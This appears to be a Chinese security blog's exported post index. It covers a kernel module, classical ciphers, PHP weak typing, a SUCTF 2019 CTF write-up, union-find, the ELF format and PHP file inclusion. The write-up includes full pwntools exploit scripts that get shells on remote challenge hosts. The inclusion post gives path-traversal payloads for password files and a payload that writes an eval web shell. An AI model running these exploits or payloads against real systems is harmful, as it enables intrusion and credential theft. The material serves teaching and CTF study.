"mychar: Device has been opened %d time(s)\n", numberOpens); return 0;&#125;static ssize_t dev_read(struct file * filep, char * buffer, size_t len, loff_t * offset) &#123; int error_count = 0; error_count = copy_to_user(buffer, message, size_of_message); if (error_count == 0) &#123; printk(KERN_INFO "mychar: Sent %d characters to the user\n", size_of_message); return (size_of_message = 0); &#125; else &#123; printk(KERN_INFO "mychar: Failed to send %d characters to the user\n", error_count); return -EFAULT; &#125;&#125;static ssize_t dev_write(struct file * filep, const char * buffer, size_t len, loff_t * offset)&#123; sprintf(message, "%s(%d letters)", buffer, len); size_of_message = strlen(message); printk(KERN_INFO "mychar: Received %d characters from the user\n", len); return len;&#125;static int dev_release(struct inode * inodep, struct file * filep)&#123; printk(KERN_INFO "mychar: Device successfully closed\n"); return 0;&#125;module_init(mychar_init);module_exit(mychar_exit); 对应Makefile. 123456obj-m := mychar.oall: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean 该内核模块加载后就可以作为一个字符设备被打开. 1234567891011121314151617181920212223242526272829303132333435363738//test.c#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;errno.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;static char receive[256];int main()&#123; int ret, fd; char stringToSend[256]; fd = open("/dev/mychar", O_RDWR); if (fd &lt; 0) &#123; perror("Failed to open the device..."); return errno; &#125; printf("Type in a short string to send to the kernel module:\n"); scanf("%[^\n]%*c", stringToSend); printf("Writing message to the device [%s].\n", stringToSend); ret = write(fd, stringToSend, strlen(stringToSend)); if (ret &lt; 0) &#123; perror("Failed to write the message to the device."); return errno; &#125; printf("Press ENTER to read back from the device...\n"); getchar(); printf("Reading from the device...\n"); ret = read(fd, receive, 256); if (ret &lt; 0) &#123; perror("Failed to read the message from the device."); return errno; &#125; printf("The received message is: [%s]\n", receive); return 0;&#125; scanf参数表示读取到第一个\n字符为止. 此时的驱动设备还存在权限问题和竞争问题,权限问题可以通过修改设备权限解决,竞争问题可以通过互斥锁解决.]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[crypto-encrypt-古典密码]]></title>
    <url>%2Fposts%2Fd4da9b5e%2F</url>
    <content type="text"><![CDATA[奇奇怪怪的编码列举一下常见的编码方式. ASCII Base64/32/16Base64,Base32,Base16可以分别编码转化8位字节为6位,5位,4位.16,32,64分别表示用多少个字符来编码. Base64编码要求把3个8位字节转化为4个6位的字节,之后在6位的前面补两个0.6位2进制能表示64个字符.下面是映射表.Base32,Base16类似. 1234567import base64base64.b64encode(str)base64.b64decode(str)base64.b32encode(str)base64.b32decode(str)base64.b16encode(str)base64.b16decode(str) Quoted-printable任何一个8位的字节值可编码为3个字符,一个=后跟随两个十六进制数字表示该字节的数值.例如:ASCII码换页符(12)可以表示为=0C,等号(61)必须表示为=3D(避免歧义).除了可打印ASCII字符与换行符以外,所有字符必须表示为这种格式. Quoted-printable编码的数据的每行长度不能超过76个字符.为满足此要求又不改变被编码文本,在QP编码结果的每行末尾加上软换行(soft line break).即在每行末尾加上一个=. Quoted-printable在线加解密. XXencode &amp;&amp; UUencodeXXencode以每三个字节为单位进行编码,不够的用零补齐.三个字节共24个Bit以6bit为单位分为4个组.同Base64基本一致,只是映射表不一样.UUencode也是一样. XXencode,UUencode在线加解密. URL编码又叫百分号编码,是统一资源定位(URL)编码方式.编码方法即在该字节ascii码的的16进制字符前面加%. URL编码在线加解密. Unicode编码Unicode编码有四种编码方式.&amp;#x[Hex];,&amp;#[Decimal];,\U[Hex],\U+[Hex]. Unicode编码在线加解密. Escape编码又叫%u编码,采用UTF-16BE模式,Escape编码就是字符对应UTF-16的16进制表示方式前面加%u. Escape编码在线加解密. HTML实体编码手册. 敲击码敲击码(Tap code)通过使用一系列的点击声音来编码.基于5 × 5方格波利比奥斯方阵来实现的. 123456 1 2 3 4 51 A B C/K D E2 F G H I J 3 L M N O P4 Q R S T U5 V W X Y Z 莫尔斯电码莫尔斯电码(Morse Code)通过通和断不同的排列顺序来表达不同英文字母,数字和标点符号的信号代码,莫尔斯电码主要由5种代码组成:.,-,空格表示停顿,/划分中等的停顿,句子之间长的停顿. 莫尔斯电码在线加解密 各种文本加密列举一下常见的文本加密方式,参考网站. 换位加密不改变文本本身,只改变排列顺序的加密. 栅栏密码栅栏密码(Rail-fence Cipher)把要加密的明文分成N个一组,然后把每组的第1个字符组合,每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合,全部连接起来就是密文. 栅栏密码在线加解密 曲路密码 替换加密字符与字符之间的映射. 埃特巴什码以字母倒序排列作为特殊密钥的替换加密. 12ABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBA 凯撒密码凯撒密码(Caesar Cipher或称恺撒加密,恺撒变换,变换加密,位移加密)是一种替换加密,明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文. 加密解密链接. 还有一种基于密钥的凯撒密码,其基本原理是将密钥的每一位转换为数字(一般转化为字母表对应顺序的数字),分别以这一数字为密钥加密明文的每一位字母. ROT5/13/18/47传送门. 简单替换密码以每个明文字母被与之唯一对应且不同的字母替换的方式实现的,是混乱的,可以利用词频分析解密. 希尔密码猪圈密码以格子为基础的简单替代式密码.传送门. 维吉尼亚密码维吉尼亚密码是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>encrypt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-PHP-弱类型]]></title>
    <url>%2Fposts%2Fa92ea0b6%2F</url>
    <content type="text"><![CDATA[概览PHP弱类型导致的漏洞主要来源于类型转换和内置函数对于传入错误类型的参数时的错误处理. 自动类型转换在PHP中变量是以C语言的结构体来存储的,空字符串,NULL,false都是以0存储.这个结构体有个zend_uchartype成员变量,用来保存变量的类型. 不同类型的变量进行比较的时候就会存在类型转换比较其值.当其中一个变量为整数时,会把另一个变量强制转化为整数,相当于intval函数. 12340 == '0' //true0 == 'abcdefg' //true1 == '1abcdef' //true#==比较值,===既比较类型也比较值. 字符串以0e\d+开头时会被解析为科学计数法(例如hash值比较). 字符串以0x开头时会被解析为十六进制(例如hash值比较). 内置函数 md5(),其参数为string,但参数为array时其并不会报错,返回0,所以任意2个array的md5()返回值都一样. strcmp(),当其中有参数为数字时就会返回null. switch(),会将参数强制转化为整数. in_array:在strict参数没提供的情况下进行的是松散比较. 还有其他函数也会在参数传递过程中发送例如字符串与整数间的转化,也可能会导致bypass或其他漏洞.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-suctf-2019]]></title>
    <url>%2Fposts%2Fb0cce827%2F</url>
    <content type="text"><![CDATA[pwnplayfmt发现栈中留有栈指针和堆指针,通过%?$n修改栈指针的值使其指向堆指针,再修改堆指针偏移指向堆中的flag,%s打印即可. 123456789101112131415161718192021222324252627282930313233343536from pwn import *#context.log_level = 'debug'#r = process("./playfmt")r = remote("120.78.192.35", "9999")r.recvuntil("=====================\n")r.recvuntil("=====================\n")payload = "%18$p\n%6$p\nmvp"r.send(payload)heap = int(r.recvuntil("\n"), 16) - 0x18stack = int(r.recvuntil("\n"), 16)print "heap: " + hex(heap)print "stack: " + hex(stack)r.recvuntil("mvp")payload = "%" + str((stack % 0x100) + 0x10) + "d%6$hhnmvp"r.send(payload)r.recvuntil("mvp")payload = "%16d%14$hhnmvp"r.send(payload)r.recvuntil("mvp")payload = "%18$smvp"r.send(payload)print r.recvuntil("mvp")[:-3]#gdb.attach(r) 二手破电脑rename的解密脚本. 123456789101112131415#include&lt;stdio.h&gt;int main() &#123; char buf[9] = &#123;0&#125;; char key[9] = "Qf(&gt;qwd!"; buf[7] = '!'; for(int i = 6;i &gt;= 0;i--) &#123; for(;;buf[i]++) &#123; if((((buf[i] | buf[i + 1]) &amp; ~(buf[i] &amp; buf[i + 1]) | i) &amp; ~((buf[i] | buf[i + 1]) &amp; ~(buf[i] &amp; buf[i + 1]) &amp; i)) == key[i]) &#123; break; &#125; &#125; &#125; puts(buf);&#125; comment时未封闭字符串,throwaa泄露heap和leak. perchase存在off-by-one.堆重叠后进行fastbin attack控制部分堆区,修改堆指针. rename两次修改,首先将堆指针改为指向free_hook,再修改free_hook为system.getshell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *context(os="linux", arch="amd64")context.log_level = 'debug'def perchase(size, name, price): r.sendline('1') r.sendlineafter('Name length: ', str(size)) r.sendafter('Name: ', name) r.sendlineafter('Price: ', str(price)) r.recvuntil('&gt;&gt;&gt; ')def comment(index, content, score): r.sendline('2') r.sendlineafter('Index: ', str(index)) r.send(content) r.sendlineafter('And its score: ', str(score)) r.recvuntil('&gt;&gt;&gt; ')def throwaa(index): r.sendline('3') r.sendlineafter('your index: ', str(index)) data = r.recvuntil('&gt;&gt;&gt; ') return datadef rename(index, content, xss): r.sendline('4') r.sendlineafter('Give me an index: ', str(index)) r.send(content) r.sendlineafter('Wanna get more power?(y/n)', 'y') r.sendlineafter('Give me serial: ', 'e4SyD1C!') r.sendlineafter('Hey Pwner', xss)#r = process('./pwn')r = remote("47.111.59.243", "10001")r.recvuntil('&gt;&gt;&gt; ')perchase(0xa0, "a" * 0xa0, 0x40)#0comment(0, "a" * 0x8c, 0x40)perchase(0xa0, "a" * 0xa0, 0x40)#1comment(1, "a" * 0x8c, 0x40)throwaa(0)perchase(0xa0, "a" * 0xa0, 0x40)#0comment(0, "a" * 1, 0x40)libc = u32(throwaa(0)[12:16]) - 0x1b07b0throwaa(1)perchase(0x140, "a" * 0x140, 0x400)#0comment(0, "a" * 1, 0x40)heap = u32(throwaa(0)[8:12]) - 0x61fake = "/bin/sh\x00" * 9 + "a" * 0xf0 + p32(0) + p32(0x161 - 0x138 + 0x190) + p32(0) + p32(0x41);perchase(0x148, fake, 0x40)#0#leak libc &amp; heapperchase(0x10, "a" * 0x10, 0x40)#1perchase(0x10, "a" * 0x10, 0x40)#2perchase(0x10, "a" * 0x10, 0x40)#3throwaa(1)throwaa(2)throwaa(3)#6perchase(0x3b, "a" * 0x3b, 0x40)#1perchase(0x188, p32(0x100) * (0x188 / 4), 0x40)#2perchase(0x40, "a" * 0x40, 0x40)#3perchase(0x40, "a" * 0x40, 0x40)#4throwaa(2)throwaa(1)perchase(0x3c, "a" * 0x3c, 0x40)#1perchase(0xb8, "a" * 0xb8, 0x40)#2perchase(0x38, "a" * 0x38, 0x40)#5throwaa(2)throwaa(3)throwaa(5)perchase(0x1d0, "a" * 0xb8 + p32(0) + p32(0x41) + p32(heap + 0x178) + "a" * 0x10c, 0x40)#2perchase(0x38, "a" * 0x38, 0x40)#3fake = p32(0x150) + p32(0x19) + p32(0) + p32(heap + 0x38)fake += p32(0x40) * 2 + p32(0) + p32(0x19) + p32(0) + p32(heap + 0x178) + p32(0x40) + p32(0) * 2fake += p32(0x19)perchase(0x38, fake, 0x40)#5#fastbin attackr.sendline('4')r.sendlineafter('Give me an index: ', str(2))fake = p32(0x150) + p32(0x19) + p32(0) * 3 + p32(heap + 0x38)fake += p32(libc + 0x1b18b0) * 10r.send(fake)r.sendlineafter('Wanna get more power?(y/n)', 'y')r.sendlineafter('Give me serial: ', 'e4SyD1C!')r.sendlineafter('Hey Pwner', p32(libc + 0x3a940))print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive() babystack主函数没有漏洞,通过IDA的Strings窗口进行交叉引用发现漏洞函数sub_407F60. 发现套路和hitb-gsec-2017的babystack很像,修改payload即可. 这里触发异常需要利用这段汇编,只要esi为0即可触发除0异常,实际上就是让输入等于返回地址. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwintools import *r = Process("babystack.exe")r.recvuntil("stack address = 0x")stack = int(r.recvline()[:-2], 16)r.recvuntil("main address = 0x")main = int(r.recvline()[:-2], 16)print "stack: " + hex(stack)print "main: " + hex(main)r.recvline()r.sendline(hex(main - 0x395e + 0x8551))r.recvline()r.recvline()r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack - 0x30))seh_next = int(r.recvline().split("0x")[2], 16) print "seh_next: " + hex(seh_next)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack - 0x2c))seh_handle = int(r.recvline().split("0x")[2], 16) print "seh_handle: " + hex(seh_handle)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(main - 0x395e + 0x7c004))security_cookie = int(r.recvline().split("0x")[2], 16) print "security_cookie: " + hex(security_cookie)fake_scope_table = security_cookie ^ (stack - 0x7c)print "fake_scope_table: " + hex(fake_scope_table)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack - 0x3c))check = int(r.recvline().split("0x")[2], 16) print "check: " + hex(check)r.recvline()r.sendline("go")payload = ""payload += "a" * 0x50payload += "\xe4\xff\xff\xff" + p32(0) + "\x0c\xff\xff\xff" + p32(0)payload += "\xfe\xff\xff\xff" + p32(main - 0x395e + 0x8224) + p32(main - 0x395e + 0x8266)payload += "a" * 0x24payload += p32(check) + "a" * 8 + p32(seh_next) + p32(seh_handle) + p32(fake_scope_table) + p32(0) + p32(stack)#这里注意要修改ebp,触发正确的异常处理函数r.sendline(payload)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(0))r.interactive() ReverseSignin加密过程为RSA,解密即可. 12345d = 91646299298871237857836940212608056141193465208586711901499120163393577626813e = 65537n = 103461035900816914121390101299049044413950405173712170434161686539878160984549p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419 输入v8.sub_96A实际就是将hex转ASCII. 12345678910111213141516171819202122sub_96A(&amp;v8, (__int64)&amp;v9);//v9 = 0x73756374667b50776e5f405f68756e647265645f79656172737d;//suctf&#123;Pwn_@_hundred_years&#125;//byte_202010: 30h, 31h, 32h, 33h, 34h, 35h, 36h, 37h, 38h, 39h, 61h, ...size_t __fastcall sub_96A(const char *a1, __int64 a2)&#123; size_t result; // rax int v3; // [rsp+18h] [rbp-18h] int i; // [rsp+1Ch] [rbp-14h] v3 = 0; for ( i = 0; ; i += 2 ) &#123; result = strlen(a1); if ( v3 &gt;= result ) break; *(_BYTE *)(a2 + i) = byte_202010[(char)(a1[v3] &gt;&gt; 4)]; *(_BYTE *)(a2 + i + 1LL) = byte_202010[a1[v3++] &amp; 0xF]; &#125; return result;&#125; cryptoMT1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from Crypto.Random import randomfrom Crypto.Util import number#from flag import flagdef convert(m): m = m ^ m &gt;&gt; 13 m = m ^ m &lt;&lt; 9 &amp; 2029229568 m = m ^ m &lt;&lt; 17 &amp; 2245263360 m = m ^ m &gt;&gt; 19 return mdef revert(m): m = m ^ m &gt;&gt; 19 m = m ^ m &lt;&lt; 17 &amp; 0b10000101110101000000000000000000 m = m ^ m &lt;&lt; 9 &amp; 0b00000000000000111001011000000000 m = m ^ m &lt;&lt; 9 &amp; 0b00000000111100000000000000000000 m = m ^ m &lt;&lt; 9 &amp; 0b01111000000000000000000000000000 m = m ^ m &gt;&gt; 13 &amp; 0b00000000000001111111111111000000 m = m ^ m &gt;&gt; 13 &amp; 0b00000000000000000000000000111111 return mdef transform(message): assert len(message) % 4 == 0 new_message = '' for i in range(len(message) / 4): block = message[i * 4 : i * 4 +4] block = number.bytes_to_long(block) block = convert(block) block = number.long_to_bytes(block, 4) new_message += block return new_messagedef detranform(message): assert len(message) % 4 == 0 new_message = '' for i in range(len(message) / 4): block = message[i * 4 : i * 4 +4] block = number.bytes_to_long(block) block = revert(block) block = number.long_to_bytes(block, 4) new_message += block return new_messagetransformed_flag = "641460a9e3953b1aaa21f3a2"flag = detranform(transformed_flag.decode('hex')).encode('hex')print 'flag&#123;' + flag + '&#125;'#flag&#123;84b45f89af22ce7e67275bdc&#125; MISC签到题附件打开后,很显然是base64加密文件,由于一般字符串加密不会出现+/符号,所以猜测是图片加密,对比一个以往的图片转base64的题目,发现本题与那题开头字符串一致,所以猜测是jpg加密,在开头补上data:imge/jpg;bae64,,然后在线解密一下就得到原有图片了.原图即是flag.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-algorithm-union-find]]></title>
    <url>%2Fposts%2Ff3617fb7%2F</url>
    <content type="text"><![CDATA[union-find一个集合可以被一种等价关系分为多个等价类,比如两个点的相连关系可以将一个点集分为多个连通分量,将这种判断是否连通并更新对应连通分量的问题称为动态连通性问题. 可以给每一个连通分量选择一个不同的标识符,通过检索标识符并判断是否相等来判断连通性. 如果对所有同一连通分量中的点都保存标识符,检索过程只需要一次即可,但是合并连通分量时就要遍历点集. 如果一个点只保存自己链接的点,初始链接自己,合并只改变一个点的链接,而检索过程需要沿链接向上找到根链接点(链接自己). 在第二种方法中实际上将关系变成了森林,而且第二种情况可以优化,对于合并时谁作为父节点,通过比较前连通分量的结点数实现加权算法. Java实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public class UF&#123; private int[] id; private int count; public UF(int N) &#123; count = N; id = new int[N]; for (int i = 0; i &lt; N; i++) &#123; id[i] = i; &#125; &#125; public int count() &#123; return count; &#125; public boolean connected(int p, int q) &#123; return find(p) == find(q); &#125; /* 对所有同一连通分量中的点都保存同一标识符 */ public int find(int p) &#123; return id[p]; &#125; public void union(int p, int q) &#123; int pID = find(p); int qID = find(q); if (pID == qID) return; for (int i = 0; i &lt; id.length; i++) &#123; if(id[i] == pID) id[i] = qID; &#125; count--; &#125; /* 一个点只保存自己链接的点 */ public int find(int p) &#123; while (p != id[p]) p = id[p]; return p; &#125; public void union(int p, int q) &#123; int pRoot = find(p); int qRoot = find(q); if (pRoot == qRoot) return; id[pRoot] = qRoot; count--; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>算法模型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-逆向分析-Linux-ELF]]></title>
    <url>%2Fposts%2F1749f5d0%2F</url>
    <content type="text"><![CDATA[概览(ELF)[https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf],即`Executable and Linking Format(可执行可连接格式),具有这种格式的文件称为ELF`文件. ELF文件主要分为以下三种类型. 可重定位文件(relocatable file):用于与其它目标文件进行连接以构建可执行文件或动态链接库.可重定位文件就是常说的目标文件,由源文件编译而成,但还没有连接成可执行文件.在UNIX系统下,一般有扩展名.o. 共享目标文件(shared object file):即动态连接库文件.它在以下两种情况下被使用:在连接过程中与其它动态链接库或可重定位文件一起构建新的目标文件;在可执行文件被加载的过程中被动态链接到新的进程中成为运行代码的一部分. 可执行文件(executable file):经过连接的,可以执行的程序文件. 文件格式从连接的角度和运行的角度,可以分别把目标文件的组成部分做以下的划分. ELF文件头位于文件的最开始处,包含有整个文件的结构信息. 节(section)是专用于连接过程而言的,在每个节中包含有指令数据,符号数据,重定位数据等等. 程序头表(program header table)在运行过程中是必须的,在连接过程中是可选的,因为它的作用是告诉系统如何创建进程的镜像. 节头表(section header table)包含有文件中所有节的信息.在连接视图中,节头表是必须存在的,文件里的每一个节都需要在节头表中有一个对应的注册项,这个注册项描述了节的名字,大小等等. ELF文件头1234567891011121314151617#define EI_NIDENT 16typedef struct &#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr; e_ident字符数组是ELF标识,即ELF文件头结构最开始的16个字节,作为一个数组,它的各个索引位置的字节数据有固定的含义. e_type表明本目标文件属于哪种类型.e_machine指定该文件适用的处理器体系结构.e_version指明目标文件的版本.e_entry指明程序入口的虚拟地址. e_phoff指明程序头表在文件中的偏移量.e_shoff指明节头表在文件中的偏移量.e_flags字段含有处理器特定的标志位.e_ehsize表明ELF文件头的大小. e_phentsize表明在程序头表中每一个表项的大小,以字节为单位.e_phnum表明程序头表中总共有多少个表项. e_shentsize表明在节头表中每一个表项的大小,以字节为单位.e_shnum表明节头表中总共有多少个表项. e_shstrndx节头表中与节名字表相对应的表项的索引,没有节名字表,此值应设置为SHN_UNDEF. 可以使用file工具与readelf -h解析数据. 节在目标文件中可以包含很多节(section),都登记在节头表(section header table)这个数组里.节头表的表项是Elf32_Shdr结构,通过每一个表项可以定位到对应的节. 目标文件中的每一个节一定对应有一个节头(section header),节头中有对节的描述信息;但有的节头可以没有对应的节,而只是一个空的头. 每一个节所占用的空间是连续的,各个节之间不会互相重叠,节与节之间可能会存在一些多余的字节,这些字节不属于任何节. 123456789101112typedef struct &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr; sh_name为节名,字符串并不存储在这里,储存的是索引号,指向字符串表节中的某个位置,那里存储了一个字符串. sh_type指明节的类型. 0-&gt;SHT_NULL:无效的节头. 1-&gt;SHT_PROGBITS:本节信息由程序定义的. 2-&gt;SHT_SYMTAB/11-&gt;SHT_STRTAB:这两类节含有符号表,目标文件最多只能各包含一个这两种节.SHT_SYMTAB提供的符号用于在创建目标文件的时候编译链接,运行期间也有可能用于动态连接,其包含完整的符号表.而SHT_DYNSYM节有一个较小的符号表,专门用于动态连接. 3-&gt;SHT_STRTAB:表明本节是字符串表,目标文件可以包含多个字符串表节. 4-&gt;SHT_RELA/9-&gt;SHT_REL:都表明本节是重定位节,含有带明确加数的重定位项.前者加数为Elf32_Rela,后者为Elf32_Rel. 5-&gt;SHT_HASH:表明本节包含哈希表,参与动态连接的目标文件都必须包含一个符号哈希表,目前目标文件中最多一个哈希表. 6-&gt;SHT_DYNAMIC:表明本节包含动态连接信息,目前目标文件中最多一个. 7-&gt;SHT_NOTE:表明本节包含的信息用于以某种方式来标记本文件. 8-&gt;SHT_NOBITS:表明本节的内容为空,不占实际空间,sh_offset只代表一个逻辑上的位置概念. 10-&gt;SHT_SHLIB:保留值. 0x70000000-&gt;SHT_LOPROC/0x7fffffff-&gt;SHT_HIPROC:为特殊处理器保留的节类型索引值的下/上界. 0x80000000-&gt;SHT_LOUSER/0xffffffff-&gt;SHT_HIUSER:为应用程序保留的节类型索引值的下/上界. sh_flags由一系列标志比特位组成,各个比特定义了节的不同属性,存在该属性设为1,反之则设为0. 0x1-&gt;SHF_WRITE:表示本节所包含的内容在进程运行过程中是可写的. 0x2-&gt;SHF_ALLOC:表示本节内容在进程运行过程中要占用内存单元. 0x4-&gt;SHF_EXECINSTR:表示此节内容是指令代码. 0xf0000000-&gt;SHF_MASHPROC:被此值所覆盖的位都是保留做特殊处理器扩展用的. 如果本节的内容需要映射到进程空间中去,sh_addr指定映射的起始地址,不需要映射则为0. sh_offset指明本节位置,该值是节的第一个字节在文件中的位置.sh_size指明节的大小.sh_addralign指明本节对齐字节,该值为0或1表明没有对齐约束,否则应该为2的正整数倍. sh_link和sh_info根据节的类型不同表示不同的意义. 可以使用readelf -S解析数据. 段可执行文件或共享目标文件的程序头表(program header table)是一个数组,数组中的每一个元素称为程序头(program header),每一个程序头描述了一个段(segment)或者一块用于准备执行程序的信息.程序头只对可执行文件或共享目标文件有意义. 12345678910typedef struct &#123; Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align;&#125; Elf32_Phdr; p_type为本程序头所描述的段的类型. 0-&gt;PT_NULL:无效的程序头. 1-&gt;PT_LOAD:本程序头指向一个可装载的段,段的内容会被从文件中拷贝到内存中. 2-&gt;PT_DYNAMIC:本段指明了动态连接的信息. 3-&gt;PT_INTERP:指向了一个字符串,是一个ELF解析器的路径.只对可执行程序有意义,最多只能出现一次,而且必须出现在其它可装载段的表项之前. 4-&gt;PT_NOTE:指向了一个字符串,包含一些附加的信息. 5-&gt;PT_SHLIB:该段类型是保留的. 6-&gt;PT_PHDR:表明的是其自身所在的程序头表在文件或内存中的位置和大小.这样的段在文件中可以不存在,只有当所在程序头表所覆盖的段只是整个程序的一部分时,才会出现一次这种表项,而且这种表项一定出现在其它可装载段的表项之前. 0x70000000-&gt;PT_LOPROC ~ 0x7fffffff-&gt;PT_HIPROC:为特定处理器保留. p_offset给出本段内容在文件中的位置.p_vaddr给出本段内容的开始位置在进程空间中的虚拟地址.p_paddr给出本段内容的开始位置在进程空间中的物理地址,现在大多无用. p_filesz给出本段内容在文件中的大小.p_memsz给出本段内容在内容镜像中的大小.p_flags给出了本段内容的属性.p_align给出本段装载的对齐值. 程序头中出现的虚拟地址不能代表其相应的数据在进程内存空间中的虚拟地址(ASLR),只能体现出相对偏移. p_flags:PF_X-&gt;0x1表示可执行属性,PF_W-&gt;0x2表示写属性,PF_R-&gt;0x4表示读属性,PF_MASKPROC-&gt;0xf0000000所覆盖的权限值(4个)是为特殊处理器保留.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-PHP-文件包含漏洞]]></title>
    <url>%2Fposts%2F6ef2fcfa%2F</url>
    <content type="text"><![CDATA[原理服务器执行PHP文件时,可以通过文件包含函数加载另一个文件中的PHP代码来执行. PHP中文件包含函数有以下四种. 1234require()require_once()include()include_once() include在包含的过程中如果出现错误,会抛出一个警告,程序继续正常运行;而require函数出现错误的时候,会直接报错并退出程序的执行. 而include_once(),require_once()这两个函数与前两个的不同之处在于这两个函数只包含一次,以避免函数重定义,变量重新赋值等问题. 漏洞实例文件包含函数加载的参数没有经过过滤或者严格的定义,可以被用户控制,包含其他恶意文件,导致了执行了非预期的代码. 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; 本地文件包含漏洞Local File Inclusion(LFI). 123456&lt;?php $file = $_GET['file']; if (file_exists('/home/wwwrun/'.$file.'.php')) &#123; include '/home/wwwrun/'.$file.'.php'; &#125;?&gt; %00截断,?file=../../../../../../../../../etc/passwd%00读取/etc/passwd.需要magic_quotes_gpc=off,PHP小于5.3.4有效. 路径长度截断,?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././..Linux需要文件名长于4096,Windows需要长于256. 点号截断,?file=../../../../../../../../../boot.ini/………[…]………….只适用Windows,点号需要长于256. 常见的敏感信息路径Windows系统. 123456789101112c:\boot.ini# 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml# IIS配置文件c:\windows\repair\sam# 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini# MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD# MySQL root密码c:\windows\php.ini# php 配置信息 Linux/Unix系统. 12345678910111213141516/etc/passwd# 账户信息/etc/shadow# 账户密码文件/usr/local/app/apache2/conf/httpd.conf# Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf# 虚拟网站配置/usr/local/app/php5/lib/php.ini# PHP相关配置/etc/httpd/conf/httpd.conf# Apache配置文件/etc/my.conf# mysql配置文件/proc/self/environ# 存储user-agent的值 远程文件包含漏洞Remote File Inclusion(RFI).PHP的配置文件allow_url_fopen和allow_url_include设置为ON,include/require等包含函数可以加载远程文件. 123&lt;?php include($_GET['filename'] . ".html");?&gt; 可以使用?,#,绕过后缀. PHP伪协议PHP带有很多内置URL风格的封装协议,可用于部分文件系统函数. php://filter条件:需要开启allow_url_include,不需要开启allow_url_fopen. php://filter(本地磁盘文件进行读取). 用法:?filename=php://filter/convert.base64-encode/resource=xxx.php,同?filename=php://filter/read=convert.base64-encode/resource=xxx.php. php://input条件:需要开启allow_url_fopen,不需要开启allow_url_include. php://input用于访问请求的原始数据的只读流.即直接读取到POST上没有经过解析的原始数据.enctype=&quot;multipart/form-data&quot;时无效. 用法:?file=php://input,数据利用POST传过去;可以使用file_get_contents(&quot;php://input&quot;)读取post数据. 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; 如果php配置文件中同时开启allow_url_fopen和allow_url_include(PHP &lt; 5.3.0),就可以造成任意代码执行.可以理解成远程文件包含漏洞,即POST过去PHP代码然后执行. 例如POST数据为&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;就会在当前目录下写入木马. data://条件:需要开启allow_url_include,不需要开启allow_url_fopen. 数据流封装器,和php://相似都是利用了流的概念,将原本文件流重定向到了用户可控制的输入流中,和php伪协议的php://input类似. 用法:data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-CSRF-攻击]]></title>
    <url>%2Fposts%2Fbc2dbbf0%2F</url>
